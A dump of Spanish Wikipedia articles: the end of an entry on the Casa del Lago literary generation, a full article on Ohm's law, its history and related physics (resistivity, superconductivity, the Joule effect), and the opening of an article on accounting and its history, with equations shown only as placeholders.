José Emilio Pacheco consideraba que 1958 fue otro año esencial para estos intelectuales, marcado por la publicación de la famosa obra del aclamado escritor Carlos Fuentes, "La región más transparente", considerada la primera novela urbana por excelencia.
Un factor que favoreció la cohesión de los autores de esta corriente, fue su integración en diversas instancias culturales con la ayuda de Jaime García Terrés, quien entre 1953 y 1965 ocupó el cargo de Director de Difusión Cultural de la Universidad Nacional Autónoma de México.
Papel fundamental desempeña en la unión de esta generación de escritores, la fundación de "La Casa del Lago", de cuyo nombre se adquiere el mote de dicha generación, ubicada en el Bosque de Chapultepec en la Ciudad de México y cuyo primer director fue el talentoso Juan José Arreola quien se encargó de reunir a una serie de artistas que sacudieron el panorama cultural de la época. En los diversos espacios se experimentó, se rompió con las formas dominantes del arte en las diversas disciplinas y con frecuencia se arriesgó hasta nuevos límites, convirtiendo al foro universitario de Chapultepec en un referente del arte emergente y un espacio de formación e información de lo que sucede en el arte en otros países.
La literatura de los escritores de la Generación de la Casa del Lago tiene un fin en sí misma y está llena de claves secretas, de influencias de escritores de otras latitudes que sólo ellos conocían en México, siempre hay mucho más que leerles entre líneas, pudiendo decirse que en forma esencial se agrupó bajo las siguientes características:







Hasta la fecha no ha habido otra generación que los supere en talento y productividad. Ningún otro grupo en México ha alcanzado tal calidad literaria y nivel de compromiso con el arte. Los más jóvenes, Carlos Monsiváis (1938-2010) y José Emilio Pacheco (1939-2014), se convirtieron en íconos de la cultura nacional.

Los autores más representativos de esta corriente literaria son:












</doc>
<doc id="6522" url="https://es.wikipedia.org/wiki?curid=6522" title="Ley de Ohm">
Ley de Ohm

La ley de Ohm, postulada por el físico y matemático alemán Georg Simon Ohm, es una ley básica de los circuitos eléctricos. Establece que la diferencia de potencial formula_1 que aplicamos entre los extremos de un conductor determinado es proporcional a la intensidad de la corriente formula_2 que circula por el citado conductor. Ohm completó la ley introduciendo la noción de resistencia eléctrica formula_3; que es el factor de proporcionalidad que aparece en la relación entre formula_1 formula_2:

La fórmula anterior se conoce como "fórmula general de la ley de Ohm", y en la misma, formula_1 corresponde a la diferencia de potencial, formula_3 a la resistencia e formula_2 a la intensidad de la corriente. Las unidades de esas tres magnitudes en el sistema internacional de unidades son, respectivamente, voltios (V), ohmios (Ω) y amperios (A).

En física, el término "ley de Ohm" se usa para referirse a varias generalizaciones de la ley originalmente formulada por Ohm. El ejemplo más simple es:

donde J es la densidad de corriente en una localización dada en el material resistivo, E es el campo eléctrico en esa localización, y "σ" (sigma) es un parámetro dependiente del material llamado conductividad. Esta reformulación de la ley de Ohm se debe a Gustav Kirchhoff.

Georg Simon Ohm nació en Erlangen (Alemania) el 16 de marzo de 1789 en el seno de una familia protestante, y desde muy joven trabajó en la cerrajería de su padre, el cual también hacía las veces de profesor de su hijo. Tras su paso por la universidad dirigió el Instituto Politécnico de Núremberg y dio clases de física experimental en la Universidad de Múnich hasta el final de su vida. Falleció en esta última ciudad el 6 de julio de 1854.

Poniendo a prueba su intuición en la física experimental consiguió introducir y cuantificar la resistencia eléctrica. Su formulación de la relación entre intensidad de corriente, diferencia de potencial y resistencia constituye la ley de Ohm, por ello la unidad de resistencia eléctrica se denominó ohmio en su honor.

Sufrió durante mucho tiempo la reticencia de los medios científicos europeos para aceptar sus ideas pero finalmente la Real Sociedad de Londres lo premió con la Medalla Copley en 1841 y la Universidad de Múnich le otorgó la cátedra de Física en 1849.

En 1840 estudió las perturbaciones sonoras en el campo de la acústica fisiológica (ley de Ohm-Helmholtz) y a partir de 1852 centró su actividad en los estudios de carácter óptico, en especial en los fenómenos de interferencia.
Años antes de que Ohm enunciara su ley, otros científicos habían realizado experimentos con la corriente eléctrica y la tensión. Destaca el caso del británico Henry Cavendish, que experimentó con la botella de Leyden en 1781 pero no llegó a publicar sus conclusiones, hasta que casi 100 años después, en 1879, James Clerk Maxwell las publicó.

En la actualidad disponemos de muchos instrumentos que nos permiten medir con precisión la tensión (voltaje) y la corriente eléctrica pero en el siglo XIX muchos dispositivos, tales como la pila Daniell y la pila de artesa, no estaban disponibles. Los aparatos que medían la tensión y la corriente de la época no eran suficientes para obtener lecturas precisas para el desarrollo de la fórmula que George S. Ohm quería obtener.

Es por ello por lo que Ohm, mediante los descubrimientos que otros investigadores realizaron anteriormente, creó y modificó dispositivos ya fabricados para llevar a cabo sus experimentos. La balanza de torsión de Coulomb es uno de estos aparatos; fue descrito por Ohm en su artículo «Vorläufige Anzeige des Gesetzes, nach welchem Metalle die Contactelectricität», publicado en 1825 en los "Anales de la Física". Ohm incluyó en la balanza una barra magnética gracias a los avances de Hans Christian Ørsted, que en 1819 descubrió que un cable conductor por el que fluía una corriente eléctrica desviaba una aguja magnética situada en sus proximidades. Con esto y varios cables de distintas longitudes y grosor, una pila voltaica y recipientes de mercurio, pudo crear un circuito en el que buscaba relacionar matemáticamente la disminución de la fuerza electromagnética creada por una corriente que fluye por un cable y la longitud de dicho cable.

Mediante este circuito llegó a encontrar una expresión que representaba correctamente todo los datos obtenidos:

Esta relación la puso en entredicho el propio Georg Ohm; sin embargo fue la primera expresión documentada que le llevó a su relación entre la corriente formula_2, la tensión formula_1 y la resistencia formula_11 de un circuito: la ley de Ohm, publicada en 1827 en su artículo «El circuito galvánico, analizado matemáticamente» («Die galvanische Kette, mathematisch bearbeitet»): 

Este último artículo recibió una acogida tan fría que lo impulsó a presentar la renuncia a su cargo de profesor de matemáticas en el colegio jesuita de Colonia. Finalmente, en 1833 aceptó una plaza en la Escuela Politécnica de Núremberg en la que siguió investigando.

La importancia de esta ley reside en que verifica la relación entre la diferencia de potencial en bornes de una resistencia o impedancia, en general, y la intensidad de corriente que circula a su través. Con ella se resuelven numerosos problemas eléctricos no solo de la física y de la industria sino también de la vida diaria como son los consumos o las pérdidas en las instalaciones eléctricas de las empresas y de los hogares. También introduce una nueva forma para obtener la potencia eléctrica, y para calcular la energía eléctrica utilizada en cualquier suministro eléctrico desde las centrales eléctricas a los consumidores. La ley es necesaria, por ejemplo, para determinar qué valor debe tener una resistencia a incorporar en un circuito eléctrico con el fin de que este funcione con el mejor rendimiento.

En un diagrama se muestran las tres formas de relacionar las magnitudes físicas que intervienen en la ley de Ohm, formula_1, formula_11 e formula_2.

La elección de la fórmula a utilizar dependerá del contexto en el que se aplique. Por ejemplo, si se trata de la curva característica I-V de un dispositivo eléctrico como un calefactor, se escribiría como: I = V/R. Si se trata de calcular la tensión V en bornes de una resistencia R por la que circula una corriente I, la aplicación de la ley sería: V= R I. También es posible calcular la resistencia R que ofrece un conductor que tiene una tensión V entre sus bornes y por el que circula una corriente I, aplicando la fórmula R = V/ I.

Una forma mnemotécnica más sencilla de recordar las relaciones entre las magnitudes que intervienen en la ley de Ohm es el llamado "triángulo de la ley de Ohm": para conocer el valor de una de estas magnitudes, se tapa la letra correspondiente en el triángulo y las dos letras que quedan indican su relación (teniendo en cuenta que las que están una al lado de otra se multiplican, y cuando quedan una encima de la otra se dividen como en un operador matemático común).

En los circuitos de alterna senoidal, a partir del concepto de impedancia, se ha generalizado esta ley, dando lugar a la llamada ley de Ohm para circuitos recorridos por corriente alterna, que indica:

siendo formula_2 corresponde al fasor corriente, formula_1 al fasor tensión y formula_17 a la impedancia.

Algunas partículas presentan una propiedad fundamental de la materia llamada carga eléctrica. Para estudiar la corriente eléctrica interesa ver cómo se desplazan esas cargas, es decir cómo se mueven las partículas elementales con una carga asociada como los electrones o los iones. La corriente se define como la carga neta que fluye a través de un área transversal formula_18 por unidad de tiempo.

Su unidad en el SI es el amperio (A). Un amperio es un culombio por segundo (electrones/segundo). Dado que en el movimiento de las cargas pueden intervenir tanto cargas positivas como negativas, por definición se adopta el criterio de que la corriente eléctrica tiene el sentido del movimiento de cargas positivo.

Tal y como está definida la corriente, parece que la velocidad a la que se desplazan los electrones es constante. Sin embargo, para conseguir una corriente eléctrica es necesario que las cargas estén sometidas a un campo eléctrico formula_19. El campo eléctrico es la fuerza por unidad de carga. Por tanto, al establecer una corriente eléctrica se ejerce sobre las cargas una fuerza eléctrica formula_20 y sobre las partículas cargadas se producirá, por tanto, una aceleración, tal y como señala la primera ley de Newton. Cada electrón experimenta una fuerza formula_20; por tanto, la aceleración es

siendo formula_22 la masa de la partícula cargada. Como formula_19 es constante y la masa y la carga también, entonces formula_24 también es constante.
El razonamiento anterior es válido cuando las cargas se mueven en el vacío y, por tanto, sin encontrar ningún obstáculo a su movimiento. Sin embargo, al desplazarse las cargas (electrones) por el interior de un material, por ejemplo en un metal, chocan reiteradamente con los iones de la estructura del metal, de forma que la velocidad definitiva con la que se mueven las cargas es constante. A esta velocidad (formula_25) se le llama velocidad de arrastre o de deriva. 

El fenómeno de los choques se puede interpretar como una fuerza de rozamiento o resistiva que se opone a formula_26 hasta el punto de anularla, y entonces la velocidad neta de las cargas es constante. En cierta manera el fenómeno es similar al de las gotas de lluvia que en lugar de caer con una aceleración constante ( formula_27 ), alcanzan una velocidad límite constante en su caída debido a la presencia de aire.

La densidad de corriente formula_28 es un vector que lleva la dirección de la corriente y el sentido del campo eléctrico que acelera las cargas (si el material es lineal) como se explica en la Ley de Ohm en forma local. El vector formula_28 establece, además, una relación directa entre la corriente eléctrica y la velocidad de arrastre formula_30 de las partículas cargadas que la forman. Se supone que hay formula_31 partículas cargadas por unidad de volumen. Se tiene en cuenta también que la formula_32 es igual para todas las partículas. En estas condiciones se tiene que en un tiempo formula_33 una partícula se desplazará una distancia formula_34.
Se elige un volumen elemental tomado a lo largo del conductor por donde circula la corriente y se amplía para observarlo mejor. Por ejemplo, el volumen de un cilindro es igual a formula_35. El número de partículas dentro del cilindro es formula_36. Si cada partícula posee una carga formula_37, la carga formula_38 que fluye fuera del cilindro durante el tiempo formula_33 es formula_40.

La corriente por unidad de área trasversal se conoce como densidad de corriente formula_41.
La densidad de corriente, y por tanto el sentido de circulación de la corriente, lleva el signo de las cargas positivas, por ello sustituimos en la expresión anterior formula_37 por formula_43 y se obtiene, finalmente, lo siguiente:
La densidad de corriente se expresa como un vector cuyo sentido es el del campo eléctrico aplicado al conductor. Su expresión vectorial es:

Si por ejemplo se tratara de electrones, su carga formula_37 es negativa y el sentido de su velocidad de arrastre formula_30 también negativo; el resultado sería, finalmente, positivo.

Las aplicaciones más generales sobre la corriente eléctrica se realizan en conductores eléctricos, siendo los metales los más básicos. En un metal los electrones de valencia siguen el llamado modelo de electrón libre, según el cual los electrones de valencia de un metal tienen libertad para moverse y están deslocalizados, es decir, no se pueden asociar a ningún ion de la estructura porque están continuamente moviéndose al azar, de forma similar a las moléculas de un gas. Las velocidades de los electrones dependen de la temperatura del material conductor; a la temperatura ambiente estas velocidades térmicas son elevadas, pudiendo alcanzar valores de formula_46. Ahora bien, el hecho de que se desplacen no quiere decir que haya una corriente eléctrica: el movimiento que llevan a cabo es desordenado y al azar, de forma que en conjunto el desplazamiento de unos electrones se compensa con el de otros y el resultado es que el movimiento neto de cargas es prácticamente nulo.

Cuando se aplica un campo eléctrico formula_19 a un metal los electrones modifican su movimiento aleatorio de tal manera que se arrastran lentamente en sentido opuesto al del campo eléctrico. De esta forma la velocidad total de un electrón pasa a ser la velocidad que tenía en ausencia de campo eléctrico más la provocada por el campo eléctrico. Así, la trayectoria de este electrón se vería modificada. Aparece, pues, una velocidad neta de los electrones en un sentido que recibe el nombre de velocidad de arrastre formula_48. Los valores numéricos de esta velocidad son bajos pues se encuentran en torno a los formula_49.
Si se toma como tiempo τ el tiempo promediado entre colisiones del electrón con los iones atómicos, usando la expresión de la aceleración que provoca un campo eléctrico sobre una carga, se obtiene la velocidad de arrastre formula_50. Sustituyendo en la ecuación anterior para la densidad de corriente formula_28, se llega a "la ley de Ohm microscópica o en forma local".

donde σ es la llamada conductividad eléctrica que relaciona directamente la densidad de corriente formula_28 en un conductor y el campo eléctrico aplicado al mismo formula_53. En materiales lineales u óhmicos esta relación es lineal y a mayor campo eléctrico aplicado, mayor será la densidad de corriente generada, con su misma dirección y sentido ya que es una ley vectorial.

A partir de la ley de Ohm en forma local se puede obtener la ley de Ohm macroscópica, generalmente usada. Para ello se parte de un conductor metálico de sección formula_54 por donde circula una corriente formula_2 y se toma una longitud formula_56 del mismo. Entre los dos extremos del tramo se aplica una diferencia de potencial formula_57. Por tanto, si se sustituye en la expresión anterior sucede que 

Por definición, la relación entre la densidad J y la intensidad I de la corriente eléctrica que circula a través del conductor es formula_58 y formula_11 es una propiedad importante del material conductor que se llama resistencia eléctrica, que es inversamente proporcional a la conductividad del material y que representa una medida de la oposición del conductor a la conducción eléctrica.

La ley de Ohm determina que para algunos materiales —como la mayoría de los conductores metálicos— la densidad de corriente formula_41 y el campo eléctrico formula_61 se relacionan a través de una constante formula_62llamada conductividad, característica de cada sustancia. Es decir:

Esta es la ley de Ohm en forma local, obtenida a partir de la noción del campo eléctrico que acelera a los electrones que se desplazan libremente por el metal conductor. Gracias a ella se ha obtenido la ley clásica o macroscópica:

Para los metales y casi todos los otros conductores, R es constante; esto es, no depende de la cantidad de corriente. En algunos materiales, y notablemente en los materiales semiconductores, R no es constante y este hecho es muy útil en rectificadores, amplificadores y otros aparatos.

Aquellos materiales cuya resistencia es constante se conocen como lineales u óhmicos, mientras que aquellos donde no es constante se los denomina no lineales o no óhmicos. En ciertos materiales no lineales, la relación formula_63 o curva característica Volt-Ampere, tiene algunos tramos lineales donde puede suponerse que R es constante. Además, los elementos no lineales pueden clasificarse en simétricos y asimétricos; siendo los primeros aquellos cuyas características formula_63 no dependen de los sentidos de las corrientes ni de las tensiones en sus extremos, y los segundos resultan aquellos cuyas características formula_63 son diferentes para distintos sentidos de las corrientes y de las tensiones.

Esta ley contiene menos información, al ser escalar, que la ley para la densidad de corriente (que incluye módulo, dirección y sentido por su naturaleza vectorial).

No se puede considerar la ley de Ohm como una ley fundamental de la naturaleza ya que solo la cumplen ciertos materiales por lo que se considera una relación empírica. Sin embargo, esta ley tiene aplicación práctica para una gran variedad de materiales, en especial los metales.

El inverso de la conductividad es la resistividad; que es la resistencia eléctrica específica de un determinado material, se simboliza con la letra griega rho minúscula (ρ) y se mide en ohmios metro.

Una diferencia de potencial formula_66 mantenida a través de un conductor establece un campo eléctrico formula_67 y este campo produce una corriente formula_68 que es proporcional a la diferencia de potencial. Si el campo se considera uniforme, la diferencia de potencial formula_69 se puede relacionar con el campo eléctrico formula_67 de la siguiente forma:

Por tanto, la magnitud de la densidad de corriente en el cable formula_71 se puede expresar como:

Puesto que formula_72, la diferencia de potencial puede escribirse como:

La cantidad formula_73 se denomina resistencia formula_11 del conductor. La resistencia es la razón entre la diferencia de potencial aplicada a un conductor formula_75 y la corriente que pasa por el mismo formula_68:

Dicha igualdad representa un caso particular de la ecuación formula_77, donde la sección del conductor es uniforme y el campo eléctrico creado también, lo que permite expresar el ohmio (formula_78) como unidad de la resistencia de la siguiente manera:

Dado que formula_11 es igual a formula_80, la resistencia de un conductor cilíndrico determinado es proporcional a su longitud e inversamente proporcional al área de su sección transversal.

La resistividad formula_81 es una propiedad de una sustancia, en tanto que la resistencia es la propiedad de un objeto constituido por una sustancia y con una forma determinada. Las sustancias con resistividades grandes son malos conductores o buenos aislantes, e inversamente, las sustancias de pequeña resistividad son buenos conductores.

La resistividad de cada material óhmico depende de las propiedades de dicho material y de la temperatura y, por otro lado, la resistencia de una sustancia depende de la forma del material y de la resistividad. En general, la relación funcional entre la temperatura y la resistividad de un metal puede calcularse a partir de la relación polinómica:

En el rango de temperaturas de 0ºC a 200ºC, la resistividad de un metal varía aproximadamente de manera lineal con la temperatura de acuerdo con la expresión:

Donde formula_82 es la resistividad a cierta temperatura formula_83 (en grados Celsius), formula_84 es la resistividad a determinada temperatura de referencia formula_85 (que suele considerarse igual a 20º C) y formula_86 es el coeficiente de temperatura de resistividad.

Nótese que los valores de formula_86 son en general positivos, salvo para el carbono, el germanio y el silicio.

Dado que en un objeto determinando, la resistencia es proporcional a la resistividad, se puede denotar la variación en su resistencia como:

A partir de la fórmula anterior se pueden realizar determinaciones de temperatura, a partir de la medición de la resistencia de un objeto.

Para los metales la resistividad es casi proporcional a la temperatura, aunque siempre hay una zona no lineal a muy bajas temperaturas donde resistividad suele acercarse a un determinado valor finito según la temperatura se acerca al cero absoluto. Esta resistividad cerca del cero absoluto se debe, sobre todo, a choques de electrones con impurezas e imperfecciones en el metal. En contraposición, la resistividad de alta temperatura (la zona lineal) se caracteriza, principalmente, por choques entre electrones y átomos metálicos.

La disminución de la resistividad a causa a la temperatura, con valores de formula_86 negativos, es debida al incremento en la densidad de portadores de carga a muy altas temperaturas. En vista de que los portadores de carga en un semiconductor a menudo se asocian con átomos de impurezas, la resistividad de estos materiales es muy sensible al tipo y concentración de dichas impurezas.


Los metales son materiales que conducen bien el calor y la electricidad. Cuando una corriente eléctrica circula por un hilo conductor, este se calienta. Dicho fenómeno se conoce como efecto Joule, se debe a que los metales presentan cierta resistencia al paso de la corriente eléctrica por su interior, ya que cuando se mueven sufren colisiones con los átomos del material. Sin embargo, en un material superconductor esto no ocurre; estos materiales no ofrecen ninguna resistencia al paso de la corriente eléctrica por debajo de una cierta temperatura formula_90, llamada temperatura crítica.
Los electrones se agrupan en parejas interaccionando con los átomos del material de manera que logran sintonizar su movimiento con el de los átomos, desplazándose sin sufrir colisiones con ellos. Esto significa que no se calientan, por lo que no hay pérdida de energía al transportar la corriente eléctrica debido al efecto Joule. La teoría básica que explica su comportamiento microscópico se llama 'teoría BCS' porque fue publicada por Bardeen, Cooper y Schrieffer en 1957. Sin embargo, en sentido estricto, no hay una única teoría CBS sino que agrupa a un cierto número de ellas, que son en parte fenomenológicas.

El valor de formula_90 depende de la composición química, la presión y la estructura molecular. Algunos elementos como el cobre, la plata o el oro, excelentes conductores, no presentan superconductividad.

La gráfica resistencia-temperatura para un superconductor sigue la de un metal normal a temperaturas por encima de formula_90.

Cuando la temperatura alcanza el valor de formula_90, la resistividad cae repentinamente hasta cero. Este fenómeno fue descubierto en 1911 por el físico neerlandés Heike Kamerlingh Onnes, de la Universidad de Leiden. Onnes estudió a principios del siglo XX las propiedades de la materia a bajas temperaturas. Su trabajo le llevó al descubrimiento de la superconductividad en el mercurio al ser enfriado a –269 °C. Sus esfuerzos se vieron recompensados en 1913 cuando se le concedió el .

Recientes mediciones han demostrado que las resistividades de superconductores por debajo de sus valores de temperaturas críticas son inferiores a formula_94 —aproximadamente formula_95 veces más pequeños que la resistividad del cobre— y en la práctica se consideran iguales a cero. Actualmente se conocen miles de superconductores y las temperaturas críticas de los superconductores son bastante más elevadas de lo que en principio se pudo suponer.

En 1986 Johannes Georg Bednorz y Karl Alexander Müller (ganadores del Premio Nobel en 1987), en unos laboratorios de IBM en Suiza, descubrieron los materiales superconductores cerámicos. Estos materiales han revolucionado el mundo de la superconductividad al poder trabajar a temperaturas por encima de la de ebullición del nitrógeno líquido (–169 °C), lo que permite enfriarlos con mucha facilidad y de forma barata. Dichos materiales superconductores han logrado que aumente el interés tecnológico para desarrollar un gran número de aplicaciones.

Una de las características más importantes de los superconductores es que una vez que se ha establecido en ellos una corriente, esta persiste sin necesidad de una fuerza electromotriz aplicada debido a la práctica ausencia de resistencia. Se han observado corrientes estables que persisten en circuitos superconductores durante varios años sin un decaimiento aparente.

En 1933 Walter Meissner y Robert Ochsenfeld descubrieron que un material superconductor no solamente no presenta resistencia al paso de corriente, sino que también cuenta entre sus propiedades la capacidad para apantallar un campo magnético. Si enfriamos el superconductor por debajo de su temperatura crítica y lo colocamos en presencia de un campo magnético, este crea corrientes de apantallamiento capaces de generar un campo magnético opuesto al aplicado. Esto ocurre hasta que el campo magnético alcanza un valor, llamado campo magnético crítico, momento en el que el superconductor deja de apantallar el campo magnético y el material recupera su estado normal.

El hecho de que el superconductor pueda apantallar totalmente el campo magnético de su interior se conoce como superconductividad tipo I. Los superconductores tipo II permiten que el campo magnético pueda penetrar en su interior sin dejar de ser superconductores. Este comportamiento se mantiene para campos magnéticos cuyo valor puede ser hasta varios millones de veces el campo magnético terrestre. Mientras que los superconductores tipo I siempre intentan expulsar el campo magnético de su interior, los de tipo II se oponen a que este cambie.

Llamamos efecto Joule al fenómeno irreversible por el cual si en un conductor circula corriente eléctrica, parte de la energía cinética de los electrones se transforma en calor debido a los choques que sufren con los átomos del material conductor por el que circulan, elevando la temperatura del mismo. Llega un momento en el que la temperatura del conductor alcanza el equilibrio térmico con el exterior, comenzando entonces a disipar energía en forma de calor. El nombre es en honor a su descubridor, el físico británico James Prescott Joule.

El movimiento de los electrones en un conductor es desordenado; esto provoca continuos choques entre los electrones y los átomos móviles de la red y como consecuencia aparece un aumento de la temperatura en el propio conductor pues transforma energía cinética en calorífica de acuerdo con la siguiente ecuación y tomando como unidades [P]=W=vatios, [V]=V=voltios, [I]=A=amperios, [E]=J=julios, [t]=s=segundos,

para la potencia disipada en un tramo conductor que tiene una tensión V entre sus extremos y circula a su través una corriente I. Además, la energía que habrá disipado al cabo de un tiempo t será:

De las dos ecuaciones se deduce: formula_96 

Según Joule, «la cantidad de energía calorífica producida por una corriente eléctrica depende directamente del cuadrado de la intensidad de la corriente, del tiempo que esta circula por el conductor y de la resistencia que opone el mismo al paso de la corriente». Con [R]=Ω=ohmios. Si sustituimos en esta ecuación, la ley de Ohm clásica formula_97, se obtiene la ley de Joule en su forma más clásica: 

Asimismo, ya que la potencia disipada es la energía perdida por unidad de tiempo, podemos calcular la potencia disipada en un conductor o en una resistencia de las siguientes tres maneras:

El funcionamiento eléctrico y las aplicaciones de numerosos electrodomésticos se fundamentan primero en la ley de Ohm, y en segundo lugar, sus implicaciones energéticas, en la ley de Joule. En algunos de estos aparatos eléctricos como los hornos, las tostadoras, las calefacciones eléctricas y otros empleados industrialmente, el efecto útil buscado es precisamente el calor que desprende el conductor por el paso de la corriente. En la mayoría de las aplicaciones, sin embargo, es un efecto indeseado y la razón por la que los aparatos eléctricos y electrónicos (como el ordenador) necesitan un ventilador que disipe el calor generado y evite el calentamiento excesivo de los diferentes dispositivos.

Como explica la ley de Ohm, para que circule corriente por un circuito es necesario aportar una energía para mantener una diferencia de potencial y crear el campo eléctrico que acelera las cargas. Se denomina fuerza electromotriz formula_98 (FEM) a la energía necesaria para transportar la unidad de carga positiva a través de un circuito cerrado. Esta energía proviene de cualquier fuente, medio o dispositivo que suministre la energía eléctrica, como puede ser una pila o una batería. Para ello se necesita mantener una diferencia de potencial formula_99 entre dos puntos o polos de dicha fuente que sea capaz de impulsar las cargas eléctricas a través de un circuito cerrado. En el caso de pilas o baterías la energía inicial es de origen químico que se transforma en energía eléctrica para disiparse posteriormente en el conductor por efecto Joule.

La energía suministrada al circuito puede expresarse como:

La potencia que suministra generador es: 

Comparando ambas expresiones se obtiene una posible justificación de fuerza electromotriz. Los generadores reales se caracterizan por su fuerza electromotriz y por su resistencia interna, es decir, un generador transforma en energía eléctrica otras formas de energía y cuando es recorrido por una corriente, se calienta. Esto representa una pérdida de potencia suministrada al circuito exterior. Expresión de la potencia suministrada al circuito por un generador real: 

Este balance de energías se puede analizar en un circuito cerrado básico con una batería de fem formula_98 y de resistencia interna formula_102 por el que circula una corriente formula_2 y alimenta una resistencia formula_11. Además, formula_99 es la diferencia de potencial que se aplica en los bornes del generador que por la ley de Ohm será igual a formula_106. Este balance se puede expresar como:

Significa que la potencia suministrada por el generador es igual a la suministrada al circuito exterior formula_108, más la consumida internamente formula_109.

Dividiendo la expresión anterior por la corriente eléctrica resulta lo siguiente:

Cuando un generador suministra una energía al circuito, este es recorrido por una intensidad de corriente, los electrones del circuito son acelerados por el campo eléctrico "E" y la diferencia de potencial entre las bornes del generador se reduce en el valor de la caída de potencial que se produce en su resistencia interna. La diferencia de potencial entre los bornes del generador de una corriente eléctrica I a través del circuito es: 

Si no circula corriente por el circuito (circuito abierto), al ser la intensidad nula la fuerza electromotriz coincidirá con la diferencia de potencial entre los bornes del generador.




</doc>
<doc id="6524" url="https://es.wikipedia.org/wiki?curid=6524" title="Contabilidad">
Contabilidad

La contabilidad es una rama de la contaduría pública que se encarga de cuantificar, medir y analizar la realidad económica, las operaciones de las organizaciones, con el fin de facilitar la dirección y el control presentando la información, previamente registrada, de manera sistemática y ordenada para las distintas partes interesadas. Dentro de la contabilidad se registran las transacciones, cambios internos o cualquier otro suceso que afecte económicamente a una entidad.

La finalidad de la contabilidad es suministrar información en un momento dado de los resultados obtenidos durante un período de tiempo, que resulta de utilidad a sus usuarios, en la toma de decisiones, tanto para el control de la gestión pasada, como para las estimaciones de los resultados futuros, dotando tales decisiones de racionalidad y eficiencia.

Actualmente la contabilidad es regulada por dos agencias para evitar el fraude. Las mismas son Generally Accepted Accounting Principles, por sus siglas GAAP, en los Estados Unidos y la Financial Accounting Standards Board, por su siglas FASB, esta es a nivel internacional.

Es una disciplina que sigue el método para generar y después aplicar cierta teoría y también procesos, los cuales son:



El término contabilidad proviene de la unión de los términos "con" (que significa "globalmente"), "putare" (que significa calcular o evaluar), "bilis" (que puede) y el sufijo "dad" (cualidad).

La contabilidad puede ser clasificada en dos ramas, dependiendo del criterio de división utilizado. De acuerdo con el tipo de unidad económica a la que se refiere la información contable generada se puede hacer la siguiente clasificación:

La contabilidad nacional ofrece la representación numérica sistemática de la actividad económica de un país, durante un periodo determinado. Es elaborada por los Estados, suministra información útil que orienta la política económica del país.

Es la contabilidad de las pequeñas unidades económicas. Su objetivo es suministrar información que se utilizará en la toma de decisiones. Dentro de la microcontabilidad se distingue una contabilidad pública, ejecutada por las distintas administraciones públicas y una contabilidad privada, orientada a la empresa.

Dentro de la contabilidad empresarial, los usuarios de la información contable pueden ser divididos en dos usuarios, internos y externos. El grupo de usuarios internos comprende a todas aquellas personas u órganos que utilizan la información desde dentro de la empresa para la toma de decisiones adecuada en la dirección de la misma. Por otro lado, los usuarios externos utilizan la contabilidad para la gestión de la empresa objeto de la información, y comprenden a todos aquellos entes que no participan en la gestión, como accionistas, acreedores, prestamistas, clientes, inversores, empleados y la administración pública, especialmente la administración tributaria, y que necesitan básicamente de la información contable para tomar también decisiones y controlar la empresa desde múltiples puntos de vista. En función de los usuarios de la contabilidad se distingue entre contabilidad financiera y contabilidad directiva o de gestión:

La historia de la contabilidad y de su técnica está ligada al desarrollo del comercio, la agricultura y la industrialización como actividades económicas. Desde su comienzo, se buscó la manera de conservar el registro de las transacciones y de los resultados obtenidos en la actividad comercial. Los arqueólogos han encontrado en las civilizaciones del Imperio inca, del Antiguo Egipto y de Roma variadas manifestaciones de registros contables, que de una manera básica constituyen un registro de las entradas y salidas de productos comercializados, así como del dinero. La utilización de la moneda fue importante para el desarrollo de la contabilidad, ya que no cabía una evolución semejante en una economía de trueque.

Existía dificultad para proporcionar datos objetivos sobre el desarrollo de la contabilidad en el Mundo Antiguo, especialmente en Roma, por la escasez de documentos conservados sobre la materia y por su desconocimiento formal sobre ésta. Si se conoce que gozaba de un papel relevante, así se admitía como medio jurídico de prueba la inscripción de préstamos en el libro contable del acreedor ("Codex rationum") y en el libro de ingresos y gastos, ("codees acceti et expensi"). Catón el Viejo, en su obra "De re rustica" (o "Res rustica"), incluye los datos fundamentales que se requerían para la contabilidad y su utilización como herramienta para evaluar la gestión de los negocios por los "factores" frente a los propietarios agrícolas que solían residir en las ciudades.

Algunos historiadores han creído observar en los fragmentos incompletos que se conservan de contabilidad un primer desarrollo del principio de la partida doble, aunque existe mucha diversidad de opiniones sobre esta tesis, hay algunas citas de grandes autores, como Cicerón, que parecen sustentar tal hecho, pero son demasiado confusas como para establecer la tesis de que el método de la partida doble era conocido en la Antigüedad.

Las prácticas contables más o menos evolucionadas habituales en el mundo antiguo desaparecieron, debido a la casi completa extinción del comercio en Europa en los siglos posteriores a la caída del Imperio romano. La contabilidad tuvo que desarrollarse partiendo de cero, especialmente al compás del auge comercial, que tuvo su primer gran impulso con las cruzadas.

Dos grandes órdenes militares, la de los templarios y la de los caballeros teutónicos, desarrollaron durante los siglos XII y XIII sistemas de contabilidad perfeccionados, influidos probablemente por las prácticas de los comerciantes libaneses con los que ambas órdenes tuvieron contacto en sus inicios.

Los caballeros teutónicos trasladaron su actividad a las regiones bálticas y allí mantuvieron contacto con las ciudades comerciales de la Liga Hanseática. Esta Liga desarrolló con profecía la «contabilidad de factor», es decir, la del comisionista que debe rendir cuentas a su comitente. En tanto que los mercaderes italianos presentaron mayor atención a una contabilidad de carácter patrimonial, más adaptada al contrato del comerciante sobre sus empleados.

Las repúblicas comerciales italianas y los Países Bajos serían durante los últimos siglos de la Edad Media las regiones europeas en que la vida comercial iba a ser más intensa. Como consecuencia natural, la práctica contable iría desarrollando nuevos métodos en estos países, y por lo tanto, sería en todas estas repúblicas italianas donde surgiría la moderna contabilidad.

De los primitivos memoriales, en los que los comerciantes anotaban sin ningún orden particular las diversas operaciones que precisaban recordar, se fue evolucionando poco a poco hacia un sistema contable de partida simple; a medida que el gran número de anotaciones necesarias aconsejó a los comerciantes y prestamistas ir desglosando del memorial diversas cuentas, en las que anotaban grupos de operaciones poseedoras de alguna característica común, tales como ir referenciadas a una determinada mercadería o bien a una misma persona. El modo de hacer las anotaciones fue perfeccionándose cada vez más y originó el progresivo desarrollo de ciertas reglas prácticas, hasta que en un momento no determinado con exactitud por los historiadores apareció, en la zona de influencia económica italiana, el método de la partida doble.

La partida doble tuvo su origen probablemente en la región de la Toscana antes de finales del siglo XIII, el ejemplo más antiguo de su uso son las cuentas públicas de la ciudad de Génova del año 1340. En el siglo XV, parece ser que los banqueros y comerciantes toscanos disponían de una técnica contable tan desarrollada o más que la empleada por los venecianos, y diferente en algunos puntos importantes de la de estos. Sin embargo fue la contabilidad "a la veneziana" la que se impuso, gracias a la imprenta, que permitió su difusión antes que ninguna otra.

